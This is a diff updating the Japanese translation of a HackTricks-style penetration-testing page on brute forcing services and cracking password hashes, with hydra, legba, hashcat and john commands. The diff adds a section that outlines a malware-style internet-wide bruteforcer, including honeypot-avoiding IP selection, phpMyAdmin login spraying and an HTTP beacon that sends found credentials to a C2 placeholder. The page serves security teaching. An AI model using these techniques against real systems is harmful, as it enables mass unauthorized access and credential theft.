@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Default Credentials
+## デフォルト認証情報
 
-**Search in google** を使って、使用している技術の default credentials を検索するか、**これらのリンクを試す**：
+**googleで検索**して使用されている技術のデフォルト認証情報を探すか、または**以下のリンクを試してください**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,9 +19,9 @@
 - [**https://many-passwords.github.io/**](https://many-passwords.github.io)
 - [**https://theinfocentric.com/**](https://theinfocentric.com/)
 
-## **独自の辞書を作成する**
+## **独自のワードリストを作成する**
 
-対象に関する情報をできるだけ集め、カスタム辞書を作成する。役立つツール：
+ターゲットに関する情報をできるだけ収集し、カスタムワードリストを生成してください。役立つツール:
 
 ### Crunch
 ```bash
@@ -34,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### ウェブサイトベースのwordlists
+### ウェブサイトベースのワードリスト
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -47,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-被害者に関する知識（名前、日付など）に基づいてパスワードを生成する
+被害者に関する知識（名前、日付など）を基にパスワードを生成する
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-wordlist generator toolで、単語のセットを入力することで、与えられた単語から複数のバリエーションを作成し、特定のターゲットに対して使用するためのユニークで最適なwordlistを生成できます。
+wordlistジェネレーターで、単語のセットを指定するとその単語から複数のバリエーションを生成し、特定のターゲット向けにユニークで最適なwordlistを作成できます。
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -87,9 +87,17 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## サービス
+## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
 
-サービス名のアルファベット順に並んでいます。
+- アーキテクチャに合わせて調整したワーカープールを維持する（例: `x86_64/arm64` で約95 goroutines、`i686` で約85、低スペックARMで約50） — 固定並列数を保つために各ワーカーを毎秒再生成し、各ワーカーは終了前に正確に1つのターゲットIPを処理する。
+- ランダムなpublic IPv4を生成するが、明らかにhoneypotが多いかルーティング不能なレンジは除外する: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) と DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`)。
+- サービスのポートを短いタイムアウト（約2s）でプローブしてから平文ログインを試みる（FTP/21、MySQL/3306、Postgres/5432、phpMyAdmin over HTTP/80）。リモート辞書やC2からのフェッチに失敗した場合は小さな組み込み認証情報リストにフォールバックする。
+- 小さなHTTP GETビーコン（例: `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>`、サービスコード例: `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`）でヒットをExfiltrateし、共通のブラウザUser-Agentを再利用して目立たなくする。
+- phpMyAdmin spray は `GET /index.php?lang=en` で推測される多数（~80+）のパスをブルートフォースし、PMAマーカー（`pmahomme` theme/`phpmyadmin.css`/`navigation.php`）を検出し、`codemirror.css?v=X.Y.Z` を解析して認証処理を分岐させる: バージョン `<4.9` は GET パラメータ `pma_username`/`pma_password` を受け入れ、バージョン `>=4.9` は `server=1`、CSRF `token` と同じ認証情報を含む POST を要求する。
+
+## Services
+
+サービス名のアルファベット順。  
 
 ### AFP
 ```bash
@@ -162,9 +170,9 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-http**s** の場合は "http-post-form" を "**https-post-form"** に変更してください
+http**s** の場合は "http-post-form" から "**https-post-form"** に変更する必要があります。
 
-### **HTTP - CMS --** (W)ordpress、(J)oomlaまたは(D)rupalまたは(M)oodle
+### **HTTP - CMS --** (W)ordpress、 (J)oomla または (D)rupal または (M)oodle
 ```bash
 cmsmap -f W/J/D/M -u a -p a https://wordpress.com
 # Check also https://github.com/evilsocket/legba/wiki/HTTP
@@ -284,7 +292,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login**を**patator**で使用するには、以下を**インストール**する必要があります:
+**patator**で**oracle_login**を使用するためには、**install**が必要です:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -410,13 +418,13 @@ legba ssh --username admin --password wordlists/passwords.txt --target localhost
 # Try keys from a folder
 legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
 ```
-#### 弱い SSH キー / Debian の予測可能な PRNG
+#### Weak SSH keys / Debian predictable PRNG
 
-一部のシステムでは、暗号素材を生成する際に使用されるランダムシードに既知の欠陥があります。これによりキー空間が大幅に縮小され、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) のようなツールで bruteforced できる場合があります。事前に生成された弱いキーのセットも、[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) のように入手可能です。
+一部のシステムでは、暗号資材の生成に使用される乱数シードに既知の欠陥があります。これによりキー空間が著しく縮小し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) のようなツールでブルートフォース可能になることがあります。事前生成された弱いキーのセットも [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh) のように入手可能です。
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP テキストプロトコルは、RabbitMQ、ActiveMQ、HornetQ、OpenMQ などの一般的なメッセージキューイングサービスと**シームレスな通信および相互作用を可能にする**、広く使われているメッセージングプロトコルです。メッセージの交換や各種メッセージング操作を行うための、標準化され効率的な手法を提供します。
+STOMP テキストプロトコルは広く使われているメッセージングプロトコルで、**RabbitMQ、ActiveMQ、HornetQ、OpenMQ といった一般的なメッセージキューサービスとシームレスに通信・連携できる** 機能を提供します。メッセージの交換や各種メッセージング操作を行うための標準化され効率的な手段を提供します。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -456,7 +464,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
 ## ローカル
 
-### オンライン cracking データベース
+### オンラインクラックデータベース
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 & SHA1)
 - [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP and with any challenge's value)
@@ -470,7 +478,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Hash を brute force しようとする前に、これを確認してください。
+Hashをbrute forceする前に、これを確認してください。
 
 ### ZIP
 ```bash
@@ -490,8 +498,8 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-暗号化されたzipの**内部に含まれるファイルのプレーンテキスト**（またはその一部）を知っている必要があります。次のコマンドを実行して、暗号化されたzipの**内部に含まれるファイル名とサイズ**を確認できます: **`7z l encrypted.zip`**\
-リリースページから [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) をダウンロードしてください.
+暗号化されたzip内に含まれるファイルの**plaintext**（またはその一部）を知っている必要があります。暗号化されたzipに含まれるファイルの**ファイル名とサイズ**は、次を実行して確認できます: **`7z l encrypted.zip`**\  
+リリースページから[**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をダウンロードしてください.
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
 zip plaintext.zip plaintext.file
@@ -525,7 +533,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-PDF Owner password を crack するには、こちらを確認してください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner Password を crack するには、こちらを確認してください: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -559,7 +567,7 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks イメージ
+### Lucksイメージ
 
 #### 方法 1
 
@@ -598,14 +606,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) を使い、その後 john を実行する
+このスクリプト [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) を使い、その後 john を実行します
 
 ### Open Office のパスワード保護された列
 
 列がパスワードで保護された xlsx ファイルがある場合、保護を解除できます:
 
-- **google drive にアップロードする** とパスワードは自動的に削除されます
-- それを**解除**するには**手動で**:
+- **Upload it to google drive** と、パスワードは自動的に削除されます
+- **削除** を **手動で** 行うには:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -639,13 +647,13 @@ hash-identifier
 
 ### **ワードリスト生成ツール**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 設定可能な base chars、keymap、routes を持つ高度な keyboard-walk ジェネレータ。
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高度な keyboard-walk ジェネレータで、ベース文字、キーマップ、ルートを設定可能。
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
-### John のミューテーション
+### John mutation
 
-_**/etc/john/john.conf**_ を読み、設定してください
+_**/etc/john/john.conf**_ を読んで設定する
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
@@ -654,16 +662,16 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 #### Hashcat attacks
 
-- **Wordlist attack** (`-a 0`) で rules を使用
+- **Wordlist attack** (`-a 0`) を rules と併用する
 
-**Hashcat** にはすでに **rulesを含むフォルダ** が同梱されていますが、[**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules) も見つけることができます。
+**Hashcat** には既に **rules を含むフォルダ** が付属していますが、[**other interesting rules here**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules) でも他の興味深い rules を見つけることができます。
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
-- **Wordlist combinator** attack
+- **Wordlist combinator** 攻撃
 
-hashcat を使うと、**combine 2 wordlists into 1** が可能です.\
-もし list 1 に単語 **"hello"** が含まれ、2 番目のリストに **"world"** と **"earth"** の 2 行が含まれている場合、`helloworld` と `helloearth` が生成されます。
+hashcatで**2つのwordlistsを1つに結合する**ことが可能です.\
+list 1 に単語 **"hello"** が含まれ、2番目のリストに **"world"** と **"earth"** の2行が含まれている場合、`helloworld` と `helloearth` が生成されます。
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -714,23 +722,23 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat のモード
+#### Hashcat モード
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Cracking Linux Hashes - /etc/shadow ファイル
+Linux ハッシュのクラック - /etc/shadow ファイル
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
 7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
 1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
 ```
-Cracking Windows Hashes
+Windows Hashes のクラック
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-一般的なアプリケーション Hashes の Cracking
+Cracking 一般的なアプリケーション Hashes
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -740,4 +748,8 @@ Cracking Windows Hashes
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
 ```
+## 参考文献
+
+- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+
 {{#include ../banners/hacktricks-training.md}}
